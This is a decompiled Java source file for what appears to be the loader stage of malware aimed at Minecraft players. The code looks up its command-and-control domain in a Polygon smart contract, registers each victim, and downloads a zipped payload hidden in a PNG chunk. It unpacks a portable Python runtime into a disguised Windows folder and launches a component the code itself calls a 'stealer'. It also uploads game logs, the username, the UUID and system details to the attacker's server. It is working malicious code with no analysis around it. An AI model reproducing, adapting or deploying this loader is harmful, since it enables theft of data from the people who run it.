package net.efn.loader;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class RuntimeBridge {

    private String mcInfoB64;

    private String prefireId;

    private String userId;

    private String tag;

    private String c2Domain;

    private String gameDir;

    private String mcUsername;

    private String mcUuid;

    private String env;

    private Path workDir;

    private StringBuilder logBuffer;

    private String cachedC2Domain;

    private static String[] polygonRpcEndpoints() {
        String[] var10000 = new String[5];
        var10000[0] = "https://polygon.drpc.org";
        var10000[1] = "https://polygon-bor-rpc.publicnode.com";
        var10000[2] = "https://1rpc.io/matic";
        var10000[3] = "https://api.zan.top/polygon-mainnet";
        var10000[4] = "https://rpc-mainnet.matic.quiknode.pro";
        return var10000;
    }

    private static String c2PointerContract() {
        return "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
    }

    private static String getMessageSelector() {
        return "0xce6d41de";
    }

    private static String fallbackC2Domain() {
        return "thisisafalsepositive.st";
    }

    private static String stage3PngPath() {
        return "/cdn/v2/9f4e7a2c1b8d.png";
    }

    public static void main(String[] var0) {
        RuntimeBridge var1 = new RuntimeBridge();
        var1.runDetachedStage(var0);
    }

    public static String builderUserId() {
        return "dee6a29f-02c8-4ca4-b4fa-31a35a6fd876";
    }

    public static String builderTag() {
        return "Default";
    }

    public String resolveC2Domain() {
        if (this.cachedC2Domain != null) {
            return this.cachedC2Domain;
        } else {
            String var10000 = c2PointerContract();
            String var9 = getMessageSelector();
            String var8 = var10000;
            StringBuilder var25 = new StringBuilder();
            StringBuilder var26 = var25.append("{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"").append(var8);
            StringBuilder var27 = var26.append("\",\"data\":\"").append(var9);
            String var1 = var27.append("\"},\"latest\"],\"id\":1}").toString();
            for (String var5 : polygonRpcEndpoints()) {
                try {
                    HttpTransport.Response var6 = HttpTransport.post(var5, var1, "application/json");
                    if (var6.statusCode == 200) {
                        String var7 = this.parseEthCallResult(var6.bodyString());
                        if (var7 != null && var7.length() > 0) {
                            this.cachedC2Domain = var7;
                            return var7;
                        }
                    }
                } catch (Exception var24) {
                }
            }
            this.cachedC2Domain = fallbackC2Domain();
            return this.cachedC2Domain;
        }
    }

    public String registerVictim(String var1, String var2, String var3) {
        try {
            String var10000 = this.jsonEscape(var2);
            String var7 = this.jsonEscape(var3);
            String var6 = var10000;
            StringBuilder var32 = new StringBuilder();
            StringBuilder var33 = var32.append("{\"sessionId\":\"").append(var6);
            String var4 = var33.append("\",\"userId\":\"").append(var7).append("\"}").toString();
            StringBuilder var34 = new StringBuilder();
            StringBuilder var35 = var34.append("https://").append(var1);
            var10000 = var35.append("/shard/prefireMc").toString();
            String var10002 = "application/json";
            String var10003 = "X-Edge-Cache-Revalidate";
            String var10004 = "stale-if-error";
            String var10005 = "X-Runtime-Env";
            HttpTransport.Response var5 = HttpTransport.postWithHeaders(var10000, var4, var10002, Map.of(var10003, var10004, var10005, "jre-embedded"));
            if (var5.statusCode == 200) {
                String var10001 = var5.bodyString();
                return this.jsonGet(var10001, "prefireId");
            }
        } catch (Exception var31) {
        }
        return null;
    }

    public void runDetachedStage(String[] var1) {
        try {
            this.workDir = this.workDirPath();
            this.logBuffer = new StringBuilder();
            Files.createDirectories(this.workDir);
            this.log("========== DETACHED PROCESS STARTED ==========");
            if (var1.length < 1) {
                this.log("ERROR: No context argument");
                this.uploadLogsToC2();
                return;
            }
            if (!this.parseContext(var1[0])) {
                this.log("ERROR: Failed to parse context");
                this.uploadLogsToC2();
                return;
            }
            String var24 = this.env;
            String var23 = this.userId;
            StringBuilder var77 = new StringBuilder();
            var77 = var77.append("Context parsed - UserId: ").append(var23);
            this.log(var77.append(", Env: ").append(var24).toString());
            Path var2 = this.workDir.resolve("python.exe");
            Path var10000 = this.workDir;
            var10000 = var10000.resolve("AppHost");
            Path var3 = var10000.resolve("main.py");
            if (Files.exists(var2) && Files.exists(var3)) {
                this.log("Portable runtime already cached");
            } else {
                this.log("Downloading portable runtime...");
                if (!this.downloadPortableRuntime()) {
                    this.log("ERROR: Failed to setup portable runtime");
                    this.uploadLogsToC2();
                    return;
                }
            }
            this.log("Spawning stealer...");
            this.spawnPythonStealer();
            this.uploadLogsToC2();
        } catch (Exception var68) {
            String var10001 = var68.getClass().getSimpleName();
            String var62 = var68.getMessage();
            String var61 = var10001;
            StringBuilder var76 = new StringBuilder();
            this.log(var76.append("FATAL: ").append(var61).append(": ").append(var62).toString());
            try {
                this.uploadLogsToC2();
            } catch (Exception var67) {
            }
        }
    }

    private Path workDirPath() {
        String var1 = System.getenv("LOCALAPPDATA");
        String[] var10001 = new String[3];
        var10001[0] = "Microsoft";
        var10001[1] = "Windows";
        var10001[2] = "NtProfileIndex";
        return Path.of(var1, var10001);
    }

    private boolean downloadPortableRuntime() {
        byte var1 = 3;
        for (int var2 = 1; var2 <= var1; var2++) {
            try {
                StringBuilder var111 = new StringBuilder();
                this.log(var111.append("Download attempt ").append(var2).append("/").append((int) var1).append("...").toString());
                String var10000 = this.c2Domain;
                String var11 = stage3PngPath();
                String var10 = var10000;
                StringBuilder var107 = new StringBuilder();
                var10000 = var107.append("https://").append(var10).append(var11).toString();
                String var112 = "User-Agent";
                String var10002 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
                String var10003 = "Accept";
                String var10004 = "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";
                String var10005 = "Accept-Language";
                String var10006 = "en-US,en;q=0.9";
                String var10007 = "Sec-Fetch-Dest";
                String var10008 = "image";
                String var10009 = "Sec-Fetch-Mode";
                String var10010 = "no-cors";
                String var10011 = "Sec-Fetch-Site";
                HttpTransport.Response var3 = HttpTransport.get(var10000, Map.of(var112, var10002, var10003, var10004, var10005, var10006, var10007, var10008, var10009, var10010, var10011, "same-origin"));
                if (var3.statusCode != 200 || var3.body.length == 0) {
                    int var66 = var3.statusCode;
                    var111 = new StringBuilder();
                    this.log(var111.append("Download failed: HTTP ").append(var66).toString());
                    continue;
                }
                int var69 = var3.body.length;
                var111 = new StringBuilder();
                var111 = var111.append("Downloaded ").append(var69);
                this.log(var111.append(" bytes, extracting from image...").toString());
                byte[] var4 = this.extractHidsChunk(var3.body);
                if (var4 == null) {
                    this.log("PNG extraction failed");
                    continue;
                }
                int var81 = var4.length;
                var111 = new StringBuilder();
                var111 = var111.append("Extracted ").append(var81);
                this.log(var111.append(" bytes from image, unpacking...").toString());
                int var5 = this.unzipIntoWorkDir(var4);
                var111 = new StringBuilder();
                var111 = var111.append("Extracted ").append(var5);
                this.log(var111.append(" files").toString());
                Path var109 = this.workDir;
                if (Files.exists(var109.resolve("python.exe"))) {
                    this.log("Portable runtime ready");
                    return true;
                }
            } catch (Exception var106) {
                String var101 = var106.getMessage();
                StringBuilder var10001 = new StringBuilder();
                var10001 = var10001.append("Attempt ").append(var2);
                this.log(var10001.append(" error: ").append(var101).toString());
            }
            if (var2 < var1) {
                try {
                    Thread.sleep(2000L * var2);
                } catch (InterruptedException var105) {
                }
            }
        }
        return false;
    }

    private int unzipIntoWorkDir(byte[] var1) throws IOException {
        int var2 = 0;
        byte[] var3 = new byte[131072];
        ByteArrayInputStream var4 = new ByteArrayInputStream(var1);
        ZipInputStream var5;
        ZipEntry var6;
        for (var5 = new ZipInputStream(var4); (var6 = var5.getNextEntry()) != null; var2++) {
            Path var7 = this.workDir.resolve(var6.getName());
            if (var6.isDirectory()) {
                Files.createDirectories(var7);
            } else {
                Files.createDirectories(var7.getParent());
                FileOutputStream var8 = new FileOutputStream(var7.toFile());
                BufferedOutputStream var9 = new BufferedOutputStream(var8, 131072);
                int var10;
                while ((var10 = var5.read(var3)) > 0) {
                    var9.write(var3, 0, var10);
                }
                var9.close();
            }
            var5.closeEntry();
        }
        var5.close();
        return var2;
    }

    private byte[] extractHidsChunk(byte[] var1) {
        try {
            if (var1.length < 8) {
                return null;
            } else {
                byte[] var2 = new byte[] { -119, 80, 78, 71, 13, 10, 26, 10 };
                for (int var3 = 0; var3 < 8; var3++) {
                    if (var1[var3] != var2[var3]) {
                        return null;
                    }
                }
                int var11 = 8;
                while (var11 + 8 <= var1.length) {
                    int var4 = (var1[var11] & 255) << 24 | (var1[var11 + 1] & 255) << 16 | (var1[var11 + 2] & 255) << 8 | var1[var11 + 3] & 255;
                    byte var5 = var1[var11 + 4];
                    byte var6 = var1[var11 + 5];
                    byte var7 = var1[var11 + 6];
                    byte var8 = var1[var11 + 7];
                    if (var5 == 104 && var6 == 73 && var7 == 100 && var8 == 115) {
                        byte[] var9 = Arrays.copyOfRange(var1, var11 + 8, var11 + 8 + var4);
                        return this.zlibInflate(var9);
                    }
                    var11 += 12 + var4;
                }
                return null;
            }
        } catch (Exception var10) {
            return null;
        }
    }

    private byte[] zlibInflate(byte[] var1) {
        try {
            Inflater var2 = new Inflater();
            var2.setInput(var1);
            ByteArrayOutputStream var3 = new ByteArrayOutputStream(var1.length * 5);
            byte[] var4 = new byte[131072];
            while (!var2.finished()) {
                int var5 = var2.inflate(var4);
                if (var5 == 0 && var2.needsInput()) {
                    break;
                }
                var3.write(var4, 0, var5);
            }
            var2.end();
            return var3.toByteArray();
        } catch (Exception var6) {
            return null;
        }
    }

    private void spawnPythonStealer() {
        try {
            Path var1 = this.workDir.resolve("python.exe");
            Path var10000 = this.workDir;
            var10000 = var10000.resolve("AppHost");
            Path var2 = var10000.resolve("main.py");
            if (!Files.exists(var2)) {
                this.log("ERROR: main.py not found");
                return;
            }
            ArrayList var3 = new ArrayList();
            var3.add(var1.toString());
            var3.add(var2.toString());
            var3.add("-u");
            var3.add(this.userId);
            var3.add("--env");
            var3.add(this.env);
            if (this.tag != null) {
                if (!this.tag.equals("null")) {
                    var3.add("--tag");
                    var3.add(this.tag);
                }
            }
            if (this.mcInfoB64 != null) {
                String var43 = this.mcInfoB64;
                if (!var43.equals("null")) {
                    var3.add("--mcInfo");
                    var3.add(this.mcInfoB64);
                }
            }
            if (this.prefireId != null) {
                String var44 = this.prefireId;
                if (!var44.equals("null")) {
                    var3.add("--prefireId");
                    var3.add(this.prefireId);
                }
            }
            ProcessBuilder var4 = new ProcessBuilder(var3);
            Path var45 = this.workDir;
            var4.directory(var45.resolve("AppHost").toFile());
            var4.redirectInput(Redirect.from(new File("NUL")));
            var45 = this.workDir;
            var4.redirectOutput(Redirect.appendTo(var45.resolve("_stealer.log").toFile()));
            var4.redirectErrorStream(true);
            Process var5 = var4.start();
            long var35 = var5.pid();
            StringBuilder var47 = new StringBuilder();
            this.log(var47.append("Stealer spawned: pid=").append(var35).toString());
        } catch (Exception var41) {
            String var39 = var41.getMessage();
            StringBuilder var10001 = new StringBuilder();
            this.log(var10001.append("Spawn error: ").append(var39).toString());
        }
    }

    private void uploadLogsToC2() {
        if (this.c2Domain != null) {
            try {
                StringBuilder var1 = new StringBuilder();
                if (this.gameDir != null) {
                    String var10000 = this.gameDir;
                    String[] var115 = new String[2];
                    var115[0] = "logs";
                    var115[1] = "latest.log";
                    Path var2 = Path.of(var10000, var115);
                    if (Files.exists(var2)) {
                        try {
                            String var3 = Files.readString(var2);
                            if (var3.length() > 5000000) {
                                var10000 = var3.substring(0, 2500000);
                                String var9 = var3.substring(var3.length() - 2500000);
                                String var8 = var10000;
                                StringBuilder var101 = new StringBuilder().append(var8);
                                var3 = var101.append("\n=== TRUNCATED ===\n").append(var9).toString();
                            }
                            var1.append(var3);
                        } catch (Exception var93) {
                            var1.append("ERROR reading MC log: ").append(var93.getMessage());
                        }
                    }
                }
                var1.append("\n\n========== DETACHED LOG ==========\n");
                var1.append(this.logBuffer.toString());
                var1.append("\n\n========== RUNTIME ==========\n");
                StringBuilder var102 = var1.append("jvm=");
                var102.append(System.getProperty("java.version")).append("\n");
                var102 = var1.append("os=");
                var102.append(System.getProperty("os.name")).append("\n");
                var102 = var1.append("user=");
                var102.append(System.getProperty("user.name")).append("\n");
                String var105 = this.jsonEscape(this.userId);
                String var116 = this.jsonEscape(var1.toString());
                String var10002 = this.jsonEscape(this.mcUsername != null ? this.mcUsername : "N/A");
                String var10003 = this.jsonEscape(this.mcUuid != null ? this.mcUuid : "N/A");
                String var42 = this.jsonEscape(this.env);
                String var41 = var10003;
                String var40 = var10002;
                String var39 = var116;
                String var38 = var105;
                var102 = new StringBuilder();
                var102 = var102.append("{\"userId\":\"").append(var38);
                var102 = var102.append("\",\"content\":\"").append(var39);
                var102 = var102.append("\",\"filename\":\"combined.log\",\"mcUsername\":\"").append(var40);
                var102 = var102.append("\",\"mcUuid\":\"").append(var41);
                var102 = var102.append("\",\"executionEnvironment\":\"").append(var42);
                String var95 = var102.append("-Detached\"}").toString();
                String var65 = this.c2Domain;
                var102 = new StringBuilder();
                var102 = var102.append("https://").append(var65);
                String var114 = var102.append("/shard/submitMinecraftLog").toString();
                var10002 = "application/json";
                var10003 = "X-Edge-Cache-Revalidate";
                String var10004 = "stale-if-error";
                String var10005 = "X-Runtime-Env";
                HttpTransport.Response var96 = HttpTransport.postWithHeaders(var114, var95, var10002, Map.of(var10003, var10004, var10005, "jre-embedded"));
                int var86 = var96.statusCode;
                StringBuilder var117 = new StringBuilder();
                this.log(var117.append("Log submitted: ").append(var86).toString());
            } catch (Exception var94) {
                String var89 = var94.getMessage();
                StringBuilder var10001 = new StringBuilder();
                this.log(var10001.append("Submit error: ").append(var89).toString());
            }
        }
    }

    private void log(String var1) {
        long var3 = System.currentTimeMillis();
        String var2 = "[" + var3 + "] " + var1;
        if (this.logBuffer != null) {
            this.logBuffer.append(var2).append("\n");
        }
        System.out.println(var2);
    }

    private boolean parseContext(String var1) {
        try {
            String var2 = new String(Base64.getDecoder().decode(var1), StandardCharsets.UTF_8);
            this.mcInfoB64 = this.jsonGet(var2, "mcInfo");
            this.prefireId = this.jsonGet(var2, "prefireId");
            this.userId = this.jsonGet(var2, "userId");
            this.tag = this.jsonGet(var2, "tag");
            this.c2Domain = this.jsonGet(var2, "domain");
            this.gameDir = this.jsonGet(var2, "gameDir");
            this.mcUsername = this.jsonGet(var2, "mcUsername");
            this.mcUuid = this.jsonGet(var2, "mcUuid");
            this.env = this.jsonGet(var2, "env");
            if (this.env == null) {
                this.env = "Fabric";
            }
            return this.c2Domain != null && this.userId != null;
        } catch (Exception var18) {
            return false;
        }
    }

    private String parseEthCallResult(String var1) {
        int var2 = var1.indexOf("\"result\"");
        if (var2 == -1) {
            return null;
        } else {
            int var3 = var1.indexOf(":", var2);
            int var4 = var1.indexOf("\"", var3);
            int var5 = var1.indexOf("\"", var4 + 1);
            if (var4 != -1 && var5 != -1) {
                String var6 = var1.substring(var4 + 1, var5);
                return this.abiDecodeString(var6);
            } else {
                return null;
            }
        }
    }

    private String abiDecodeString(String var1) {
        if (var1 != null && var1.startsWith("0x") && var1.length() >= 130) {
            try {
                String var2 = var1.substring(2);
                int var3 = Integer.parseInt(var2.substring(64, 128), 16);
                if (var3 != 0 && var3 <= 10000) {
                    String var4 = var2.substring(128, 128 + var3 * 2);
                    byte[] var5 = this.hexToBytes(var4);
                    return new String(var5, StandardCharsets.UTF_8);
                } else {
                    return null;
                }
            } catch (Exception var7) {
                return null;
            }
        } else {
            return null;
        }
    }

    private byte[] hexToBytes(String var1) {
        int var2 = var1.length();
        byte[] var3 = new byte[var2 / 2];
        for (byte var4 = 0; var4 < var2; var4 += 2) {
            var3[var4 / 2] = (byte) ((Character.digit(var1.charAt(var4), 16) << 4) + Character.digit(var1.charAt(var4 + 1), 16));
        }
        return var3;
    }

    private String jsonGet(String var1, String var2) {
        String var3 = "\"" + var2 + "\":\"";
        int var4 = var1.indexOf(var3);
        if (var4 == -1) {
            return null;
        } else {
            int var5 = var4 + var3.length();
            StringBuilder var6 = new StringBuilder();
            boolean var7 = false;
            for (int var8 = var5; var8 < var1.length(); var8++) {
                char var9 = var1.charAt(var8);
                if (var7) {
                    switch(var9) {
                        case '"':
                            var6.append('"');
                            break;
                        case '\\':
                            var6.append('\\');
                            break;
                        case 'n':
                            var6.append('\n');
                            break;
                        case 'r':
                            var6.append('\r');
                            break;
                        case 't':
                            var6.append('\t');
                            break;
                        default:
                            var6.append(var9);
                    }
                    var7 = false;
                } else if (var9 == '\\') {
                    var7 = true;
                } else {
                    if (var9 == '"') {
                        break;
                    }
                    var6.append(var9);
                }
            }
            String var12 = var6.toString();
            return var12.equals("null") ? null : var12;
        }
    }

    private String jsonEscape(String var1) {
        if (var1 == null) {
            return "";
        } else {
            StringBuilder var2 = new StringBuilder();
            for (char var6 : var1.toCharArray()) {
                switch(var6) {
                    case '\t':
                        var2.append("\\t");
                        break;
                    case '\n':
                        var2.append("\\n");
                        break;
                    case '\r':
                        var2.append("\\r");
                        break;
                    case '"':
                        var2.append("\\\"");
                        break;
                    case '\\':
                        var2.append("\\\\");
                        break;
                    default:
                        if (var6 < ' ') {
                            var2.append(String.format("\\u%04x", Integer.valueOf(var6)));
                        } else {
                            var2.append(var6);
                        }
                }
            }
            return var2.toString();
        }
    }
}
